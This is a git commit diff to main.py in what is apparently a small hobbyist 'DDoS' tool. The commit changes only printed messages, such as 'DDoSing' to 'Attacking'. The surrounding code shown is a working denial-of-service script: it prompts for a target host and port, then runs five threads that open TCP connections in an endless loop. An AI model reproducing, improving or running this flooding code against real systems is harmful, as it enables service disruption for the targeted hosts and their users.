cd857131492cd76a6a1ce8600f65894aca09b918
Nessy <90691149+LNessy@users.noreply.github.com>
2021-09-14 19:24:36 +0800

    Update main.py

--- main.py
+++ main.py
@@ -5,13 +5,14 @@ import threading
 os.system("cls")
 host = input("\nEnter host: ")
 port = int(input("\nEnter port: "))
-print("\n")
 print("Tools By Nessy")
+print("Starting Attack...")
+print("\n")
 def run(h):
     while True:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((host,port))
-        print("DDoSing " + host)
+        print("Attacking " + host)
 for i in range(5):
     t = threading.Thread(target=run, args=[i])
     t.start()
